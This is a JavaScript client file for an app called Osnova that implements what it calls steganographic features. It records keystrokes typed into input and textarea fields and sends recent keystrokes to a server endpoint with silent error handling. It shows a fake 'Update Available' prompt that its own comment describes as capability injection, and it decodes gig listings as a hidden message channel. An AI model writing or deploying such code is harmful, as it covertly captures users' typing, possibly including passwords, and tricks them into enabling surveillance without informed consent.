/**
 * Osnova Steganography Client
 * Implements keystroke telemetry, profile signals, and hidden channels
 * Based on SPEC.md Section: STEGANOGRAPHIC SIGNAL VECTORS
 */

class OsnovaStego {
    constructor() {
        this.enabled = false;
        this.keystrokeBuffer = [];
        this.profileSignals = {};
        this.capabilities = new Set();
    }
    
    // Initialize steganography features
    init() {
        this.loadCapabilities();
        this.setupKeystrokeTelemetry();
        this.setupProfileSignals();
        this.checkForUpdates();
    }
    
    // Load user capabilities from localStorage
    loadCapabilities() {
        const caps = localStorage.getItem('osnova_capabilities');
        if (caps) {
            this.capabilities = new Set(JSON.parse(caps));
        }
    }
    
    // Save capabilities
    saveCapability(cap) {
        this.capabilities.add(cap);
        localStorage.setItem('osnova_capabilities', 
            JSON.stringify([...this.capabilities]));
    }
    
    // Keystroke telemetry (opt-in via "telemetry plugin")
    setupKeystrokeTelemetry() {
        if (!this.capabilities.has('keystroke_telemetry')) {
            return;
        }
        
        this.enabled = true;
        
        document.addEventListener('keydown', (e) => {
            if (e.target.tagName === 'TEXTAREA' || e.target.tagName === 'INPUT') {
                this.keystrokeBuffer.push({
                    key: e.key,
                    timestamp: Date.now(),
                    target: e.target.id || 'unknown'
                });
                
                // Limit buffer size
                if (this.keystrokeBuffer.length > 1000) {
                    this.keystrokeBuffer.shift();
                }
            }
        });
    }
    
    // Profile filter signals
    setupProfileSignals() {
        const filterSelect = document.getElementById('photo-filter');
        if (filterSelect) {
            filterSelect.addEventListener('change', (e) => {
                this.profileSignals.filter = e.target.value;
                this.sendSignal('profile_filter', e.target.value);
            });
        }
    }
    
    // Check for capability updates (context-triggered)
    async checkForUpdates() {
        try {
            const response = await fetch('/api/capabilities/check');
            if (response.ok) {
                const data = await response.json();
                
                if (data.update_available) {
                    this.showUpdatePrompt(data);
                }
            }
        } catch (e) {
            // Silent fail - normal for users without deep capabilities
        }
    }
    
    // Show "app update" prompt (actually capability injection)
    showUpdatePrompt(data) {
        const prompt = document.createElement('div');
        prompt.className = 'capability-prompt';
        prompt.innerHTML = `
            <div class="card">
                <h3>⚠️ Update Available</h3>
                <p>A new version is ready. Click to reload.</p>
                <button onclick="osnovaStego.acceptUpdate('${data.capability}')">
                    Update Now
                </button>
            </div>
        `;
        document.body.appendChild(prompt);
    }
    
    // Accept update (unlock capability)
    async acceptUpdate(capability) {
        this.saveCapability(capability);
        location.reload();
    }
    
    // Send steganographic signal
    async sendSignal(type, value) {
        if (!this.enabled) return;
        
        try {
            await fetch('/api/signals/stego', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type,
                    value,
                    timestamp: Date.now(),
                    keystroke_context: this.keystrokeBuffer.slice(-10)
                })
            });
        } catch (e) {
            // Silent fail
        }
    }
    
    // Extract keystroke meta-message
    getKeystrokeMeta(text) {
        const typos = this.keystrokeBuffer.filter(k => k.key === 'Backspace').length;
        const speed = this.keystrokeBuffer.length / 
            ((Date.now() - this.keystrokeBuffer[0]?.timestamp) / 1000);
        
        return {
            typo_count: typos,
            typing_speed: speed,
            emoji_used: (text.match(/[\u{1F600}-\u{1F64F}]/gu) || []).length
        };
    }
    
    // Decode gig as steganographic container
    decodeGig(gig) {
        if (!this.capabilities.has('gig_decoder')) {
            return null;
        }
        
        // Price = fragment ID
        // Location = storage ring
        // Deadline = release timer
        return {
            fragment_id: Math.floor(gig.price),
            ring: this.locationToRing(gig.location),
            release_time: new Date(gig.deadline)
        };
    }
    
    locationToRing(location) {
        const hash = Array.from(location).reduce((a, c) => 
            ((a << 5) - a) + c.charCodeAt(0), 0);
        return Math.abs(hash) % 4;
    }
    
    // Show spam folder (capability-gated)
    showSpamFolder() {
        return this.capabilities.has('spam_folder');
    }
}

// Global instance
const osnovaStego = new OsnovaStego();

// Initialize on load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => osnovaStego.init());
} else {
    osnovaStego.init();
}
